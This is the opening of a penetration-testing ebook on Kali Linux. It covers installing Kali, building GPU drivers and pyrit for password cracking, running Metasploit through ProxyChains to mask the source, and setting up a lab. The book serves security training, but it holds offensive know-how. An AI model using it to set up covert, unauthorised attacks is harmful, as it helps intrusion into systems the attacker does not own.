![](images/00227.jpeg)

 ![](images/00001.jpeg)

![](images/00002.jpeg)

Mastering Kali Linux

Ajay Kumar Tiwari

![](images/00003.jpeg)

Mastering Kali Linux

Copyright © 2015 Ajay Kumar Tiwari

All rights reserved. No part of this book may be reproduced, stored in a retrieval system,
or transmitted in any form or by any means, without the prior written permission of the
publisher, except in the case of brief quotations embedded in critical articles or reviews.

Every effort has been made in the preparation of this book to ensure the accuracy of the

information presented. However, the information contained in this book is sold without

warranty, either express or implied.

First published: Oct  2015

ISBN 978-1518786983

![](images/00004.jpeg)

About the Author

Hi, My Name is Ajay Kumar tiwari . I am an IT Security Guy with keen interest in VAPT, Wireless, Mobile Security and Exploit Development. Presently, I am working as a Chief Cyber Security Architect for a Confidential Organization in Germany and Russia. I am the author of "Mastering Kali Linux","Python for Hackers","Linux Hacker"and"Easiest way to Become to Hacker" Book I hold C|EH, CISE, and OSWP Certification .  Additionally, during my studies, I was the ambassador for EC-COUNCIL programs in my university.

I have a collective experience of over 6+ years in IT Security and i run my Web Application Penetration Testing Course for Vidhyavilla, Delhi through distance learning Packages. I have delivered 90+ workshops on ethical hacking and penetration testing among various reputed colleges in India and have delivered corporate trainings on  Exploit development and Penetration testing in India . I spoke at various IT security conferences, some of my articles and research papers are available on the internet, and you can find some in popular security magazines like Hakin9 and EForensics (Wireless Forensics, iOS forensics, Mobile forensics). I have been acknowledged to find vulnerabilities in Offensive Security, Rapid7, AT&T, Facebook, Apple, BlackBerry, Redhat, Nokia, Microsoft, Adobe, Baracudda Labs, Kaneva, Zynga.com and CERT India. 

www.ajaykumartiwari.in

Table of Contents

Chapter 1: Up and Running with Kali Linux              5

Introduction              5

Installing to a hard disk drive              6

Installing to a USB drive with persistent memory              14

Installing in VirtualBox              17

Installing VMware Tools              24

Fixing the splash screen              25

Starting network services              26

Setting up the wireless network              27

Chapter 2: Customizing Kali Linux              31

Introduction              31

Preparing kernel headers              31

Installing Broadcom drivers              33

Installing and configuring ATI video card drivers              35

Installing and configuring nVidia video card drivers              38

Applying updates and configuring extra security tools              40

Setting up ProxyChains              41

Directory encryption              43

Chapter 3: Advanced Testing Lab              47

Introduction              47

Getting comfortable with VirtualBox              48

Downloading Windows Targets              56

Downloading Linux Targets              58

Attacking WordPress and other applications              59![](images/00005.jpeg)![](images/00005.jpeg)![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00006.jpeg)

Table of Contents

Chapter 4: Information Gathering              67

Introduction              67

Service enumeration              68

Determining network range              71

Identifying active machines              73

Finding open ports              74

Operating system fingerprinting              77

Service fingerprinting              79

Threat assessment with Maltego              80

Mapping the network              86

Chapter 5: Vulnerability Assessment              93

Introduction              93

Installing, configuring, and starting Nessus              94

Nessus - finding local vulnerabilities              98

Nessus - finding network vulnerabilities              101

Nessus - finding Linux-specific vulnerabilities              105

Nessus - finding Windows-specific vulnerabilities              110

Installing, configuring, and starting OpenVAS              113

OpenVAS - finding local vulnerabilities              120

OpenVAS - finding network vulnerabilities              125

OpenVAS - finding Linux-specific vulnerabilities              130

OpenVAS - finding Windows-specific vulnerabilities              134

Chapter 6: Exploiting Vulnerabilities              141

Introduction              141

Installing and configuring Metasploitable              142

Mastering Armitage, the graphical management tool for Metasploit              146

Mastering the Metasploit Console (MSFCONSOLE)              149

Mastering the Metasploit CLI (MSFCLI)              151

Mastering Meterpreter              156

Metasploitable MySQL              158

Metasploitable PostgreSQL              160

Metasploitable Tomcat              163

Metasploitable PDF              165

Implementing browser_autopwn              167

Chapter 7: Escalating Privileges              171

Introduction              171

Using impersonation tokens              171

Local privilege escalation attack              173

Mastering the Social Engineering Toolkit (SET)              175

Collecting the victim's data              180

2

![](images/00007.jpeg)

Table of Contents

Cleaning up the tracks              181

Creating a persistent backdoor              183

Man In The Middle (MITM) attack              185

Chapter 8: Password Attacks              191

Introduction              191

Online password attacks              192

Cracking HTTP passwords              196

Gaining router access              201

Password profiling              204

Cracking a Windows password using John the Ripper              210

Using dictionary attacks              211

Using rainbow tables              213

Using nVidia Compute Unified Device Architecture (CUDA)              214

Using ATI Stream              216

Physical access attacks              217

Chapter 9: Wireless Attacks              219

Introduction              219

Wireless network WEP cracking              220

Wireless network WPA/WPA2 cracking              222

Automating wireless network cracking              224

Accessing clients using a fake AP              227

URL traffic manipulation              230

Port redirection              231

Sniffing network traffic              232

3

![](images/00008.jpeg)

Dedicated to my mom

1

Up and Running with

Kali Linux

In this chapter, we will cover:

    Installing to a hard disk drive

    Installing to a USB drive with persistent memory    Installing in VirtualBox

    Installing VMware Tools

    Fixing the splash screen

    Starting network services

    Setting up the wireless network

Introduction

Kali Linux, or simply Kali, is the newest Linux distribution from Offensive Security. It is the
successor to the BackTrack Linux distribution. Unlike most Linux distributions, Kali Linux is
used for the purposes of penetration testing. Penetration testing is a way of evaluating the
security of a computer system or network by simulating an attack. Throughout this book,
we will further explore some of the many tools that Kali Linux has made available.

This chapter covers the installation and setup of Kali Linux in different scenarios, from inserting the Kali Linux DVD to configuring the network.

For all the recipes in this and the following chapters, we will use Kali Linux using GNOME 64-bit as theWindow Manager(WM) flavor and architecture (http://www.Kali.org/ downloads/). The use of KDE as the WM is not covered in this book; however, you should be able to follow the recipes without much trouble. ![](images/00005.jpeg)![](images/00005.jpeg)

                                   5

Up and Running with Kali Linux

Installing to a hard disk drive

The installation to a disk drive is one of the most basic operations. The achievement of this task will let us run Kali Linux without the DVD.

Performing the steps covered in this recipe will erase your hard drive,
making Kali Linux the primary operating system on your computer.

Getting ready

Before explaining the procedure, the following requirements need to be met:

    A minimum of 8 GB of free disk space for the Kali Linux install (although, we

recommend at least 25 GB to hold additional programs and wordlists generated with this book)

    A minimum of 512MB of RAM

    You can download Kali Linux athttp://www.kali.org/downloads/

Let's begin with the installation.

How to do it...

1.   Begin by inserting the Kali Linux Live DVD in the optical drive of your computer. You
              will ultimately come to the Kali Linux Live DVDBoot menu. ChooseGraphical install.

6

![](images/00009.jpeg)

Chapter 1

2.   Choose your language. In this case, we choseEnglish.

3.   Choose your location. In this case, we choseUnited States.

7

![](images/00010.jpeg)

Up and Running with Kali Linux

4.   Choose your keyboard configuration. In this case, we choseAmerican English.

5.   The next section to complete is the network services section. Enter a hostname.
 In this case, we enteredKali.

8

![](images/00011.jpeg)

Chapter 1

6.   Next, we have to enter a domain name. In this case, we enterkali.secureworks.
 com.

7.   You will now be presented with the opportunity to choose the password for the root
 user by entering a password twice.

9

![](images/00012.jpeg)

Up and Running with Kali Linux

8.   Choose your timezone. In this case, we choseEastern.

9.   We are now able to select our disk partition scheme. You will be presented with four
              options. ChooseGuided - use entire disk, as this allows for easy partitioning.

10

![](images/00013.jpeg)

Chapter 1

10\. At this step, you will need to acknowledge that your entire disc will be erased.
 Click onContinue.

11\. Next, you have the option of choosing one of three partitioning schemes:All files in
 one partition,Separate/home partition, orSeparate/home/user/var, and/tmp
              partitions. Considering Kali is being used more so for penetration testing purposes,
              a separation of partitions is not needed nor required (even though this is a great
              idea for your main desktop Linux distribution). In this case, chooseAll files in one
 partitionand click onContinue.

11

![](images/00014.jpeg)

Up and Running with Kali Linux

12\. Once you get to the screen which lets you know that changes are about to be made
 to your disks, chooseYesand click onContinue. Please note that this is the final
              chance to back out of having all of your data on your disc overwritten.

13\. Next, you will be asked if you want to connect to a network mirror. A network mirror
              allows you to receive updates for Kali as they become available. In this case, we
 chooseYesand click onContinue.

12

![](images/00015.jpeg)

Chapter 1

14\. You may skip the HTTP proxy page by clicking onContinue.

15\. Finally, you will be asked to install the GRUB boot loader to the master boot record.
 ChooseYesand click onContinue.

13

![](images/00016.jpeg)

Up and Running with Kali Linux

16\. You have now completed the installation of Kali Linux! Congratulations! Click on
             Continue and the system will reboot and bring you to the login page.

Installing to a USB drive with persistent memory

Having a Kali Linux USB drive provides us with the ability to persistently save system settings and permanently update and install new software packages onto the USB device, allowing us to carry our own personalized Kali Linux, with us at all times.

Thanks to tools such as Win32 Disk Imager, we can create a bootable Live USB drive of a vast majority of Linux distributions, including Kali Linux with persistent storage.

Getting ready

The following tools and preparations are needed in order to continue:
                 A FAT32-formatted USB drive with a minimum capacity of 8 GB
                 A Kali Linux ISO image

Win32 Disk Imager (http://sourceforge.net/projects/win32diskimager/
 files/latest/download)

    You can download Kali Linux fromhttp://www.kali.org/downloads/

14

![](images/00017.jpeg)

Chapter 1

How to do it...

Let's begin the process of installing Kali Linux to a USB drive:

1.   Insert a formatted/writeable USB drive:

2.   StartWin32 Disk Imager.

3.   At theImage File location, click on the folder icon and select the location of the Kali
 Linux DVD ISO image:

15

![](images/00018.jpeg)

Up and Running with Kali Linux

4.   Make sure thatSpace used to preserve files across rebootsis set to4096.

5.   Select our USB drive and click on theOK button to start creating the bootable
 USB drive.

6.   The process will take some time to complete while it extracts and copies the DVD files
 to the USB and installs the bootloader.

16

![](images/00019.jpeg)

Chapter 1

7.   When the installation is complete, we're ready to reboot the computer and boot from
 the newly created Kali Linux USB drive with persistent memory:

Installing in VirtualBox

This recipe will take you through the installation of Kali Linux in a completely isolated guest operating system within your host operating system using the well-known open source
virtualization software: VirtualBox.

Getting ready

The required prerequisites are listed as follows:

Latest version of VirtualBox (version 4.2.16 as of the time of writing) (https://www.
 virtualbox.org/wiki/Downloads).

    A copy of the Kali Linux ISO image. You can download a copy fromhttp://www.
 Kali.org/downloads/.

17

![](images/00020.jpeg)

Up and Running with Kali Linux

How to do it...

Let's begin the process of installing Kali Linux in Virtualbox:

1.   Launch VirtualBox and click onNew to start the Virtual Machine Wizard:

2.   Click on theNext button, type the name of the virtual machine, and choose the OS
 type as well as the version. In this case, we selected an operating system ofLinux
             andUbuntu (64 bit)as the version. Click on theNext button to continue:

18

![](images/00021.jpeg)

Chapter 1

3.   Select the amount of base memory (RAM) to be allocated to the virtual machine.
 We're going to use the default value. Click onNext.

4.   Create a new virtual hard disk for the new virtual machine. Click on theNext button:

5.   A new wizard window will open. Leave the default VDI file type as we're not planning
 to use other virtualization software.

6.   We'll leave the default option as the virtual disk storage details. Click onNext
             to continue.

19

![](images/00022.jpeg)

Up and Running with Kali Linux

7.   Set the virtual disk file location and size:

8.   Check whether the settings are correct and click on theCreate button to start the
 virtual disk file creation.

9.   We're back to the previous wizard with the summary of the virtual machine
 parameters. Click onCreate to finish:

20

![](images/00023.jpeg)

Chapter 1

10\. With the new virtual machine created, we're ready to install Kali Linux.

21

![](images/00024.jpeg)

Up and Running with Kali Linux

11\. On the VirtualBox main window, highlightKali Linuxand then click on the
             Settings button:

12\. Now that the basic installation steps have been followed, we will proceed to allow

you to use your downloaded ISO file as a virtual disc. This will save you from having to burn a physical DVD to complete the installation. On theSettingsscreen, click on theStorage menu option:

22

![](images/00025.jpeg)

Chapter 1

13\. Next, underStorage Tree, highlight theEmptydisc icon underneathIDE Controller.
 This selects ourvirtualCD/DVD ROM drive. To the far right of the screen, under
             Attributes, click on the disc icon. In the pop up that follows, select your Kali Linux ISO
              file from the list. If the Kali Linux ISO file is not present, select theChoose a virtual
              CD/DVD disc file... option and locate your ISO. Once you have completed these
 steps, click on theOK button:

14\. Click on theStart button and then click inside the new window and proceed with the
 installation. The installation steps are covered in theInstalling to a hard disk drive
             recipe of this chapter.

Installing the VirtualBox Extension Pack also allows us to extend the
functionality of the virtualization product by adding support for USB

2.0 (EHCI) devices, VirtualBox RDP, and Intel PXE boot ROM.

23

![](images/00026.jpeg)

Up and Running with Kali Linux

Installing VMware Tools

In this recipe, we will demonstrate how to install Kali Linux as a virtual machine using VMware Tools.

Getting ready

The following requirements need to be fulfilled:

    A previously installed Kali Linux VMware virtual machine    An Internet connection

How to do it...

Let's begin the process of installing Kali Linux on VMware:

1.   With your virtual machine's guest operating system powered on and connected to
 the Internet, open aTerminal window and type the following command to prepare
 the kernel sources:

prepare-kernel-sources

These instructions are assuming you are using either Linux or Mac OS
machines. You will not need to perform these steps under Windows.

2.   On the VMware Workstation menu bar, navigate toVM|Install VMware Tools…:

24

![](images/00027.jpeg)

Chapter 1

3.   Copy the VMware Tools installer to a temporary location and then change the location
 to the target directory:

cp  /media/VMware\ Tools/VMwareTools-8.8.2-590212.tar.gz  /tmp/; cd
/tmp/

Replace the filename according to your VMware Tools version:

VMwareTools-<version>-<build>.tar.gz

4.   Untar the installer by issuing the following command:

tar zxpf VMwareTools-8.8.2-590212.tar.gz

5.   Go to the VMware Tools' directory and run the installer:

cd vmware-tools-distrib/

./vmware-install.pl

6.   PressEnter to accept the default values in each configuration question; the same
 applies with thevmware-config-tools.pl script.

7.   Finally, reboot and we're done!

How it works...

In the first step, we prepared our kernel source. Next, we virtually inserted the VMware Tools CD into the guest operating system. Then, we created the mount point and mounted the virtual CD drive. We copied and extracted the installer in a temporary folder and finally we ran the installer leaving the default values.

Fixing the splash screen

The first time we boot into our newly installed Kali Linux system, we will notice that the splash
screen has disappeared. In order to manually fix it, we need to extractInitrd, modify it, and
then compress it again. Thankfully, there's an automated bash script created by Mati Aharoni
(also known as "muts", creator of Kali Linux) that makes the whole process easier.

How to do it...

To fix the disappeared splash screen, type the following command and hitEnter:fix-splash

25

![](images/00028.jpeg)

Up and Running with Kali Linux

Starting network services

Kali Linux comes with several network services which may be useful in various situations and are disabled by default. In this recipe, we will cover the steps to set up and start each service using various methods.

Getting ready

The following requirement is needed in order to continue:
                 A connection to the network with a valid IP address

How to do it...

Let's begin the process of starting our default service:

1.   Start the Apache server:

service apache2 start

We can verify the server is running by browsing to the localhost address.

2.   To start theSecure Shell(SSH) service, SSH keys need to be generated for the
 first time:

sshd-generate

3.   Start the Secure Shell server:

service ssh start

4.   To verify the server is up and listening, use thenetstat command:
             netstat  -tpan  | grep  22

5.   Start the FTP server:

service pure-ftpd start

6.   To verify the FTP server, use the following command:

netstat  -ant  | grep  21

You can also use theps-ef  | grep  21 command.

26

![](images/00029.jpeg)

Chapter 1

7.   To stop a service, just issue the following command:

service  <servicename> stop

Where<servicename> stands for the network service we want to stop. For example:

service apache2 stop

8.   To enable a service at boot time, use the following command:

update-rc.d  -f  <servicename> defaults

Where<servicename> stands for the network service we want at boot time. For example:

update-rc.d  -f ssh defaults

You can also do this from theServices menu in Kali

Linux. From theStartmenu, go toKali Linux|Services.

Setting up the wireless network

At last we come to the final recipe of this chapter. In this recipe, we will see the steps needed to connect to our wireless network with security enabled by using Wicd Network Manager and supplying our encryption details. Setting up our wireless network enables us to use Kali Linux wirelessly. In a true, ethical penetration test, not having to depend on an Ethernet cable enables us to have all of the freedoms of a regular desktop.

How to do it...

Let's begin setting up the wireless network:

1.   From the desktop, start the network manager by clicking on theApplications menu
 and navigating toInternet|Wicd Network Manager or by issuing the following
 command at theTerminal window:

wicd-gtk  --no-tray

27

![](images/00030.jpeg)

Up and Running with Kali Linux

2.   Wicd Network Manager will open with a list of available networks:

3.   Click on thePropertiesbutton to specify the network details. When done, click onOK:

4.   Finally, click on theConnect button. We're ready to go!

28

![](images/00031.jpeg)

Chapter 1

How it works...

In this recipe, we concluded the setup of our wireless network. This recipe began by starting the network manager and connecting to our router.

29

![](images/00004.jpeg)

2

Customizing Kali Linux

In this chapter, we will cover:

    Preparing kernel headers
    Installing Broadcom drivers

    Installing and configuring ATI video card drivers

    Installing and configuring nVidia video card drivers    Applying updates and configuring extra security tools    Setting up ProxyChains

    Directory encryption

Introduction

This chapter will introduce you to the customization of Kali so you can take full advantage of it.
We will cover the installation and configuration of ATI and nVidia GPU technologies as well as
extra tools needed for later chapters. ATI and nVidia GPU-based graphic cards allow us to use
their graphics processing units (GPU) to perform calculations as opposed to the CPU. We will
conclude the chapter with the setup of ProxyChains and encryption of digital information.

Preparing kernel headers

There will occasionally be times where we'll face the need to compile code which requires kernel headers. Kernel headers are the source code of the Linux kernel. In this first recipe, we'll explain the steps required to prepare kernel headers for later use. ![](images/00005.jpeg)![](images/00005.jpeg)![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00032.jpeg)

Customizing Kali Linux

Getting ready

An Internet connection is required to complete this recipe.

How to do it...

Let's begin the process of preparing kernel headers:

1.   We begin first by updating our distribution by executing the following command:

apt-get update

2.   Next, we must useapt-get again to prepare the kernel headers. Execute the
 following command:

apt-get install linux-headers  -  `uname  -r`

32

![](images/00033.jpeg)

Chapter 2

3.   Copy the following directory and its entire contents:

cd  /usr/src/linux

cp  -rf include/generated/* include/linux/

4.   We're now ready to compile code that requires kernel headers.

Installing Broadcom drivers

In the following recipe, we'll perform the installation of Broadcom's official Linux hybrid
wireless driver. Using a Broadcom wireless USB adapter gives us the greatest possibility
of success in terms of getting our wireless USB access point to work on Kali. For the rest
of the recipes in this book, we will assume installation of the Broadcom wireless drivers.

Getting ready

An Internet connection is required to complete this recipe.

How to do it...

Let's begin the process of installing Broadcom drivers:

1.   Open a terminal window and download the appropriate Broadcom driver from
             http://www.broadcom.com/support/802.11/linux_sta.php:

cd  /tmp/

wget http://www.broadcom.com/docs/linux_sta/hybrid-portsrc_ x86_64-v5_100_82_112.tar.gz

33

![](images/00034.jpeg)

Customizing Kali Linux

2\. Extract the downloaded driver using the following script:

mkdir broadcom

tar xvfz hybrid-portsrc_x86_64-v5_100_82_112.tar.gz  -C  /tmp/ broadcom

3\.               Modify thewl_cfg80211.c file since there's a bug in version 5.100.82.112 that
 prevents compiling the code under kernel version 2.6.39:

vim  /tmp/broadcom/src/wl/sys/wl_cfg80211.c

Look at the following piece of code at line number 1814:

#if LINUX_VERSION_CODE  > KERNEL_VERSION(2,  6,  39)

Replace it with the following:

#if LINUX_VERSION_CODE  >= KERNEL_VERSION(2,  6,  39)

Save the changes.

4.              Compile the code:

make clean
make

make install

5\. Update the dependencies:

depmod  -a

6\. Find loaded modules by issuing the following:

lsmod  | grep b43\|ssb\|bcma

7\. Remove the modules found by executing the following command:

rmmod  <module>b43

Where<module>could beb43orssborbcma.

8\. Blacklist the modules to prevent them from loading at system startup:

echo "blacklist  <module>"  >>  /etc/modprobe.d/blacklist.conf

Where<module>could beb43orssborbcmaorwl.

9\.               Finally, add the new module to the Linux Kernel to make it a part of the boot process:

modprobe wl

34

![](images/00035.jpeg)

Chapter 2

Installing and configuring ATI video card drivers

In this recipe, we'll go into the details for installing and configuring the ATI video card drivers
followed by the AMDAccelerated Parallel Processing(APP) SDK,OpenCL,andCAL++.
Taking advantage of the ATI Stream technology, we can run computationally-intensive
tasks—typically running on the CPU—that perform more quickly and efficiently. For more
detailed information regarding the ATI Stream technology, visitwww.amd.com/stream.

Getting ready

An Internet connection is required to complete this recipe. The preparation of kernel headers is also needed before starting this task, which is explained in thePreparing kernel headersrecipe at the beginning of this chapter.

How to do it...

Let's begin installing and configuring the ATI drivers:

1.   Download the ATI display driver required for your system:

cd  /tmp/

wget http://www2.ati.com/drivers/linux/amd-driver-installer-12-
1-x86.x86_64.run

We can also download the display driver from the following site:http://support. amd.com/us/gpudownload/Pages/index.aspx.

35

![](images/00036.jpeg)

Customizing Kali Linux

2.   Start the installation by typing the following command:

sh amd-driver-installer-12-1-x86.x86_64.run

3.   When the setup completes, reboot your system for the changes to take effect
 and to prevent system instability.

4.   Install the dependencies needed for further steps:

apt-get install libroot-python-dev libboost-python-dev libboost1.40-all-dev cmake

5.   Download and untar the AMD APP SDK according to your CPU architecture:

wget http://developer.amd.com/Downloads/AMD-APP-SDK-v2.6-lnx64.tgz mkdir AMD-APP-SDK-v2.6-lnx64

tar zxvf AMD-APP-SDK-v2.6-lnx64.tgz  -C  /tmp/AMD-APP-SDK-v2.6-lnx64 cd AMD-APP-SDK-v2.6-lnx64

6.   Install the AMD APP SDK by issuing the following command:

sh Install-AMD-APP.sh

7.   Set the ATI Stream paths in the.bashrc file:

echo export ATISTREAMSDKROOT=/opt/AMDAPP/  >>  ~/.bashrc source  ~/.bashrc

36

![](images/00037.jpeg)

Chapter 2

8.   Download and compile calpp:

cd  /tmp/

svn co https://calpp.svn.sourceforge.net/svnroot/calpp calpp cd calpp/trunk

cmake  .

make

make install

9.   Download and compile pyrit:

cd  /tmp/

svn co http://pyrit.googlecode.com/svn/trunk/ pyrit_src cd pyrit_src/pyrit

python setup.py build

python setup.py install

10\. Build and install OpenCL:

cd  /tmp/pyrit_src/cpyrit_opencl python setup.py build

python setup.py install

11\. Make a few changes to thecpyrit_calpp setup:
             cd  /tmp/pyrit_source/cpyrit_calpp
              vi setup.py

Look at the following line:

VERSION  = '0.4.0-dev'

Replace it with:

VERSION  = '0.4.1-dev'

Also, look at the following line:

CALPP_INC_DIRS.append(os.path.join(CALPP_INC_DIR, 'include'))

Replace it with:

CALPP_INC_DIRS.append(os.path.join(CALPP_INC_DIR, 'include/CAL'))

37

![](images/00038.jpeg)

Customizing Kali Linux

12\. Finally, add the ATI GPU module to pyrit:

python setup.py build

python setup.py install

To show the available CAL++ devices and CPU cores, we issue the following command:

pyrit list_cores

To perform a benchmark, we simply type:

pyrit benchmark

Installing and configuring nVidia video card drivers

In this recipe, we will embraceCompute Unified Device Architecture(CUDA), the nVidia

parallel computing architecture. The first step will be the installation of the nVidia developer display driver followed by the installation of the CUDA toolkit. This will give us dramatic
increases in computer performance with the power of the GPU which will be used in
scenarios like password cracking.

For more information about CUDA, please visit their website at

http://www.nvidia.com/object/cuda_home_new. html.

Getting ready

An Internet connection is required to complete this recipe.

The preparation of kernel headers is needed before starting this task, which is explained in thePreparing kernel headers recipe at the beginning of this chapter.

In order to accomplish the installation of the nVidia driver, the X session needs to be shut down.

How to do it...

Let's begin the process of installing and configuring the nVidia video card drivers:

1.   Download the nVidia developer display driver according to your CPU architecture:

cd  /tmp/

wget http://developer.download.nvidia.com/compute/cuda/4_1/rel/ drivers/NVIDIA-Linux-x86_64-285.05.33.run

38

![](images/00039.jpeg)

Chapter 2

2.              Install the driver:

chmod  +x NVIDIA-Linux-x86_64-285.05.33.run

./NVIDIA-Linux-x86_64-285.05.33.run  -kernel-source-path='/usr/src/ linux'

3\. Download the CUDA toolkit:

wget http://developer.download.nvidia.com/compute/cuda/4_1/rel/ toolkit/cudatoolkit_4.1.28_linux_64_ubuntu11.04.run

4\. Install the CUDA toolkit to/opt:

chmod  +x cudatoolkit_4.1.28_linux_64_ubuntu11.04.run

./cudatoolkit_4.1.28_linux_64_ubuntu11.04.runConfigure the environment variables required for nvcc to work:

echo PATH=$PATH:/opt/cuda/bin  >>  ~/.bashrc

echo LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/cuda/lib  >>  ~/.bashrc echo export PATH  >>  ~/.bashrc

echo export LD_LIBRARY_PATH  >>  ~/.bashrc

5\. Run the following command to make the variables take effect:

source  ~/.bashrc

ldconfig

6\.               Install pyrit dependencies:

apt-get install libssl-dev python-dev python-scapy

7\. Download and install the GPU powered tool, pyrit:

svn co http://pyrit.googlecode.com/svn/trunk/ pyrit_src cd pyrit_src/pyrit

python setup.py build

python setup.py install

39

![](images/00040.jpeg)

Customizing Kali Linux

8.   Finally, add the nVidia GPU module to pyrit:

cd  /tmp/pyrit_src/cpyrit_cuda python setup.py build

python setup.py install

To verify if nvcc is installed correctly, we issue the following command:

nvcc  -V

To perform a benchmark, we simply type the following command:

pyrit benchmark

Applying updates and configuring extra security tools

In this recipe, we will cover the process of updating Kali and configuring some extra tools which will be useful in later chapters and recipes. As Kali packages are constantly updated between releases, you will soon find that a newer set of tools are available than what were originally downloaded on your DVD ROM. We will start by updating our installation, obtaining an activation code for Nessus, and conclude by installing Squid.

How to do it...

Let's begin the process of applying updates and configuring extra security tools:

1.   Update the local package index with the latest changes made in the repositories:

apt-get update

2.   Upgrade the existing packages:

apt-get upgrade

3.   Upgrade to the latest version (if available):

apt-get dist-upgrade

40

![](images/00041.jpeg)

Chapter 2

4.   Obtain an activation code for Nessus by registering athttp://www.nessus.org/
 products/nessus/nessus-plugins/obtain-an-activation-code.

5.   Activate Nessus by executing the following command:

/opt/nessus/bin/nessus-fetch  --register A60F-XXXX-XXXX-XXXX-0006

WhereA60F-XXXX-XXXX-XXXX-0006 should be your activation code.

6.   Create a user account for the Nessus web interface:

/opt/nessus/sbin/nessus-adduser

7.   To start the Nessus server, we simply invoke the following command:

/etc/init.d/nessusd start

8.   Install Squid:

apt-get install squid3

9.   Prevent Squid from starting up automatically at boot time:

update-rc.d  -f squid3 remove

To find a particular package in the repository, we can use the following command afterapt-get update:

apt-cache search  <keyword>

Where<keyword> could be a package name or a regular expression.

Setting up ProxyChains

Breaking the direct connection between the receiver and the sender by forcing the connection of given applications through a user-defined list of proxies is the task we'll be explaining in
this recipe.

41

![](images/00042.jpeg)

Customizing Kali Linux

How to do it...

1.   Open the ProxyChains configuration file:

vim  /etc/proxychains.conf

2.   Uncomment the chaining type we want to use; in this case,dynamic_chain:

3.   Add some proxy servers to the list.

42

![](images/00043.jpeg)

Chapter 2

4.   Resolve the target host through our chained proxies:

proxyresolv www.targethost.com

5.   Now we can run ProxyChains through the application we want to use; for example,
 msfconsole:

proxychains msfconsole

Directory encryption

The last recipe of this chapter will be about information privacy. We will use TrueCrypt to hide important and secret digital information from public eyes with encryption keys.

43

![](images/00044.jpeg)

Customizing Kali Linux

How to do it...

1.   Install TrueCrypt by navigating toApplications Menu|Kali|Forensics|Digital Anti
 Forensics|install truecrypt.

Click onInstall TrueCrypt and follow the onscreen directions.

2.   Launch TrueCrypt fromApplications Menu|Kali Linux|Forensics|Digital Anti
              Forensics|truecrypt and you will see a window similar to the following screenshot:

44

![](images/00045.jpeg)

Chapter 2

3.   Click onCreate Volumeto start theTrueCrypt Volume Creation Wizard.

4.   Leave the default option and click onNext.

5.   Select theStandard TrueCryptmodule and click onNext.

6.   Click on theSelect File… button and specify a name and location for the new
 TrueCrypt volume. Click onSave when done.

7.   Click on theNext button and select the encryption and hash algorithm we want
 to use.

8.   In the next screen, we'll specify the amount of space we want for the container.

9.   Now we need to type the password for our volume. Click onNext.

10\. Choose the filesystem type.

11\. Select theCross-Platform Support depending on your needs.

12\. At the next screen, the wizard asks us to move the mouse around within the window
              to increase the cryptographic strength of the encryption keys. When done, click on
              theFormat button.

13\. The formatting will start and will conclude with the creation of the TrueCrypt volume.
 PressOKandExit.

14\. We're now back to the TrueCrypt window.

15\. To decrypt our volume, pick a slot from the list, click onSelect File…, and open our
 created volume.

45

![](images/00046.jpeg)

Customizing Kali Linux

16\. Click onMountand type our password; click onOK when done:

17.  We can now access the volume by double-clicking on the slot or through the mount
              directory. Save files in it and when finished, simply click onDismount All.

How it works...

In this recipe, we set up Truecrypt, created a protected volume, and mounted it. This is a handy tool to use in order to keep data safe from prying eyes.

46

3

Advanced Testing Lab

In this chapter, we will cover:

    Getting comfortable with VirtualBox
    Downloading Windows Targets
    Downloading Linux Targets

    Attacking WordPress and other applications

Introduction

Now that you have learned about the tools that are included in Kali Linux, we will now proceed to investigate some real-world scenarios. Many of the attacks we performed were performed intentionally on vulnerable software and systems. However, it is unlikely that when you use Kali to attack a system, it will be as unprotected as our current test platform.

In this chapter, we will explore techniques to set up some realistic testing environments. In the current state of information technology, most businesses usePlatform as a Service(PAAS) solutions, Cloud Server hosts, or employ a small network comprising of desktops, servers, and a firewall (standalone) or firewall/router combination. We will set up these environments and then launch attacks against them.

The end goal of all of our attacks will be to gain root level access. ![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00047.jpeg)

Advanced Testing Lab

Getting comfortable with VirtualBox

InChapter 1,Up and Running with Kali Linux, we briefly explored the use of VirtualBox for

installing Kali Linux in a virtual environment. VirtualBox is the current product of Oracle, and runs as an application on a host operating system. It allows for guest operating systems to be installed and run by creating virtual environments. This tool is vital to providing targets for you to test your skills with Kali Linux.

Throughout this chapter, we will depend heavily on VirtualBox and changing its configuration to get the type of network configuration we desire. We will use this section at the start of each of our scenario sections, so becoming comfortable with the steps is the key.

Getting ready

A connection to the Internet or an internal network is required to complete this module.

How to do it...

Let's begin the process by opening VirtualBox:

1.   Launch VirtualBox and click onNew to start the Virtual Machine Wizard:

2.   Click on theNext button and type the name of the virtual machine and choose the
 OSType:as well as theVersion:. In this chapter, we will use either Linux, Solaris, or
              Windows operating system. Select your appropriate operating system. Click on the
             Next button to continue:

48

![](images/00048.jpeg)

Chapter 3

3.   Select the amount of base memory (RAM) to be allocated to the virtual machine.
 We're going to use the default value. Click onNext.

4.   Create a new virtual hard disk for the new virtual machine. Click on theNext button:

49

![](images/00049.jpeg)

Advanced Testing Lab

5.   A new wizard window will open. Leave the default VDI file type as we're not planning
 to use other virtualization software.

6.   We'll leave the default option as the virtual disk storage details. Click onNext
             to continue.

7.   Set the virtual disk file location and size:

8.   Check whether the settings are correct and click on theCreate button to start the
 virtual disk file creation.

9.   We're back to the previous wizard with a summary of the virtual machine parameters.
 Click onCreate to finish:

50

![](images/00050.jpeg)

Chapter 3

10\. With the new virtual machine created, we're ready to install the operating system that
 was just configured in VirtualBox.

51

![](images/00051.jpeg)

Advanced Testing Lab

11\. On the VirtualBox main window, highlight the operating system name we just created
 and then click on theSettings button:

12\. Now that the basic installation steps have been followed, we will proceed to allow

you to use your downloaded ISO file as a virtual disc. This will save you from having to burn a physical DVD to complete the installation. On theSettingsscreen, click on theStorage menu option:

52

![](images/00052.jpeg)

Chapter 3

13\. Next, underStorage Tree, highlight theEmptydisc icon underneathController: IDE.
 This selects our "virtual" CD/DVD ROM drive. To the far right-hand side of the screen,
              underAttributes, click on the disc icon. In the pop up that follows, select your ISO file
              from the list. If the ISO file is not present, select theChoose a virtual CD/DVD disc
              file... option and locate your ISO. Once you have completed these steps, click on the
             OK button:

14\. Click on theStart button and then click inside the new window and proceed with the
 installation. The installation steps are covered in theInstalling to a hard disk drive
             recipe of this chapter.

How it works...

The chapter began by creating a new virtual instance in VirtualBox. We then proceeded to

